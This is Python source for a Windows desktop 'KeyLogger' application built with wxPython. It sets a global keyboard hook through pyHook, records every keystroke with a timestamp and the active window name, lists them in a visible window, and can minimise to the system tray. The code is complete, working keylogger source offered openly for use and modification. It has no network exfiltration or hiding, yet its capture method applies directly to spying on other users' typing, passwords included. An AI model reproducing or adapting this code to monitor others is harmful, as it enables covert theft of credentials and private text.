import pythoncom
import os
import pyHook
import time
import win32api
import win32con
import wx
import threading
import sys
from wx.lib.pubsub import setuparg1
from wx.lib.pubsub import pub

Publisher = pub.Publisher()

ID_MENU_NEW = wx.NewId()
ID_MENU_OPEN = wx.NewId()
ID_MENU_SAVE = wx.NewId()
ID_MENU_EXIT = wx.NewId()
APP_START = wx.NewId()
APP_PAUSE = wx.NewId()
APP_STOP = wx.NewId()
ID_MENU_ABOUT = wx.NewId()

keyrecord = []
appname = ''
asciistr = ''
keystr = ''
keytime = ''

changewindow = True

class TaskBarIcon(wx.TaskBarIcon):
    ID_BAR_ABOUT = wx.NewId()
    ID_BAR_MAXSHOW = wx.NewId()
    ID_BAR_MINSHOW = wx.NewId()
    ID_BAR_CLOSE = wx.NewId()

    def __init__(self, frame):
        wx.TaskBarIcon.__init__(self)
        self.frame = frame
        self.SetIcon(wx.Icon(name='resource\Keyboard.ico', type=wx.BITMAP_TYPE_ICO), u'Keylogger')
        self.Bind(wx.EVT_TASKBAR_LEFT_DCLICK, self.OnTaskBarLeftDClick)
        self.Bind(wx.EVT_MENU, self.frame.OnAboutBox, id=self.ID_BAR_ABOUT)
        self.Bind(wx.EVT_MENU, self.OnMax, id=self.ID_BAR_MAXSHOW)
        self.Bind(wx.EVT_MENU, self.OnMin, id=self.ID_BAR_MINSHOW)
        self.Bind(wx.EVT_MENU, self.frame.OnQuit, id=self.ID_BAR_CLOSE)

    def OnTaskBarLeftDClick(self, event):
        if self.frame.IsIconized():
            self.frame.Iconize(False)
        if not self.frame.IsShown():
            self.frame.Show(True)
        self.frame.Raise()

    def OnMin(self, event):
        self.frame.Iconize(True)

    def OnMax(self, event):
        if self.frame.IsIconized():
            self.frame.Iconize(False)
        if not self.frame.IsShown():
            self.frame.Show(True)
        self.frame.Raise()
        self.frame.Maximize(True)

    def CreatePopupMenu(self):
        menu = wx.Menu()
        menu.Append(self.ID_BAR_MAXSHOW, u'Max')
        menu.Append(self.ID_BAR_MINSHOW, u'Min')
        menu.Append(self.ID_BAR_ABOUT, u'About')
        menu.Append(self.ID_BAR_CLOSE, u'Quit')
        return menu

class KeyTrackThread(threading.Thread):
    def run(self):
        self.flag = 1;
        hm = pyHook.HookManager()
        hm.KeyDown = onKeyboardEvent
        hm.HookKeyboard()
        pythoncom.PumpMessages()

    def destroy(self):
        self.keyThreadId = win32api.GetCurrentThreadId()
        win32api.PostThreadMessage(self.keyThreadId, win32con.WM_DESTROY, 0, 0);

class Keylogger(wx.Frame):
    def __init__(self, *args, **kwargs):
        super(Keylogger, self).__init__(*args, **kwargs)
        self.InitUI()

    def InitUI(self):
        menubar = wx.MenuBar()
        fileMenu = wx.Menu()
        viewMenu = wx.Menu()
        toolMenu = wx.Menu()
        helpMenu = wx.Menu()

        #file menu setting
        fileMenu.Append(ID_MENU_NEW, '&New')
        fileMenu.Append(ID_MENU_OPEN, '&Open')
        fileMenu.Append(ID_MENU_SAVE, '&Save')
        fileMenu.AppendSeparator()
        fileMenu.Append(ID_MENU_EXIT, '&Quit')
        self.Bind(wx.EVT_MENU, self.OnQuit, id=ID_MENU_EXIT)

        #view menu setting
        self.shst = viewMenu.Append(wx.ID_ANY, 'show statusbar', 'Show Statusbar', kind=wx.ITEM_CHECK)
        viewMenu.Check(self.shst.GetId(), True)
        self.Bind(wx.EVT_MENU, self.ToggleStatusBar, self.shst)
        self.shtl = viewMenu.Append(wx.ID_ANY, 'show toolbar', 'Show Toolbar', kind=wx.ITEM_CHECK)
        viewMenu.Check(self.shtl.GetId(), True)
        self.Bind(wx.EVT_MENU, self.ToggleToolBar, self.shtl)

        #tool menu setting
        startitem = wx.MenuItem(toolMenu, APP_START, '&Start')
        startitem.SetBitmap(wx.Bitmap('resource\Play.png'))
        pauseitem = wx.MenuItem(toolMenu, APP_PAUSE, '&Pause')
        pauseitem.SetBitmap(wx.Bitmap('resource\Pause.png'))
        stopitem = wx.MenuItem(toolMenu, APP_STOP, '&Stop')
        stopitem.SetBitmap(wx.Bitmap('resource\Cross.png'))
        toolMenu.AppendItem(startitem)
        toolMenu.AppendItem(pauseitem)
        toolMenu.AppendItem(stopitem)

        #about menu setting
        helpMenu.Append(ID_MENU_ABOUT, '&About')
        self.Bind(wx.EVT_MENU, self.OnAboutBox, id=ID_MENU_ABOUT)

        #menubar setting
        menubar.Append(fileMenu, '&File')
        menubar.Append(viewMenu, '&View')
        menubar.Append(toolMenu, '&tool')
        menubar.Append(helpMenu, '&help')
        self.SetMenuBar(menubar)

        #status bar setting
        self.statusbar = self.CreateStatusBar()
        self.statusbar.SetStatusText('Ready')

        #tool bar setting
        self.toolbar = self.CreateToolBar()
        self.toolbar.AddLabelTool(APP_START, '', wx.Bitmap('resource\Play.png'))
        self.toolbar.AddLabelTool(APP_PAUSE, '', wx.Bitmap('resource\Pause.png'))
        self.toolbar.AddLabelTool(APP_STOP, '', wx.Bitmap('resource\Cross.png'))
        self.toolbar.Realize()

        hbox = wx.BoxSizer(wx.HORIZONTAL)

        panel = wx.Panel(self, -1)

        self.list = wx.ListCtrl(panel, -1, style=wx.LC_REPORT)
        self.list.InsertColumn(0, 'Time', width=150)
        self.list.InsertColumn(1, 'Window Name', width=100)
        self.list.InsertColumn(2, 'Ascii code')
        self.list.InsertColumn(3, 'Key Character', width=100)

        hbox.Add(self.list, 1, wx.EXPAND)
        panel.SetSizer(hbox)

        self.keyTrack = KeyTrackThread()
        self.keyTrack.setDaemon(True)
        self.keyTrack.start()
        #create a pubsub receiver
        Publisher.subscribe(self.updateDisplay, "update")

        #iconize settting
        self.taskBarIcon = TaskBarIcon(self)
        self.Bind(wx.EVT_ICONIZE, self.OnIconfiy)
        self.Bind(wx.EVT_CLOSE, self.OnQuit)

        self.SetIcon(wx.Icon('resource\Keyboard.ico', wx.BITMAP_TYPE_ICO))
        self.SetSize((600, 400))
        self.SetTitle('KeyLogger')
        self.Centre()
        self.Show(True)

    def OnIconfiy(self, event):
        self.Hide()
        event.Skip()

    def updateDisplay(self, msg):
        global changewindow
        data = msg.data
        if data:
            if changewindow == False:
                index = self.list.GetItemCount()
                self.list.SetStringItem(index-1, 2, data[2])
                self.list.SetStringItem(index-1, 3, data[3])
            else:
                index = self.list.InsertStringItem(sys.maxint, data[0])
                self.list.SetStringItem(index, 1, data[1])
                self.list.SetStringItem(index, 2, data[2])
                self.list.SetStringItem(index, 3, data[3])

    def ToggleStatusBar(self, e):
        if self.shst.IsChecked():
            self.statusbar.Show()
        else:
            self.statusbar.Hide()

    def ToggleToolBar(self, e):
        if self.shtl.IsChecked():
            self.toolbar.Show()
        else:
            self.toolbar.Hide()

    def OnAboutBox(self, e):
        description = """KeyLogger is a tool for users to record the keypad they press."""
        licence = """KeyLogger is free software. Welcome to use or modify it."""

        info = wx.AboutDialogInfo()

        #info.SetIcon(wx.Icon('', wx.BITMAP_TYPE_PNG))
        info.SetName('KeyLogger')
        info.SetVersion('1.0')
        info.SetDescription(description)
        info.SetCopyright('(c) 2013 evshary')
        info.SetWebSite('http://www.evshary.blogspot.com')
        info.SetLicence(licence)
        info.AddDeveloper('evshary')
        info.AddDocWriter('evshary')
        info.AddArtist('None')
        #info.AddTranslator('evshary')

        wx.AboutBox(info)

    def OnQuit(self, e):
        self.taskBarIcon.Destroy()
        self.Destroy()
        self.keyTrack.destroy()

def onKeyboardEvent(event):
    global appname, asciistr, keystr, keytime, changewindow
    if appname == str(event.WindowName):
        changewindow = False
        asciistr = asciistr + chr(event.Ascii)
        keystr = keystr + str(event.Key)
        wx.CallAfter(Publisher.sendMessage, "update", (keytime, appname, asciistr, keystr))
    else:
        changewindow = True
        appname = str(event.WindowName)
        asciistr = chr(event.Ascii)
        keystr = str(event.Key)
        keytime = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
        wx.CallAfter(Publisher.sendMessage, "update", (keytime, appname, asciistr, keystr))
        keyrecord.append((keytime, appname, asciistr, keystr))
    return True

def main():
    app = wx.App()
    Keylogger(None)
    app.MainLoop()

if __name__ == '__main__':
    main()
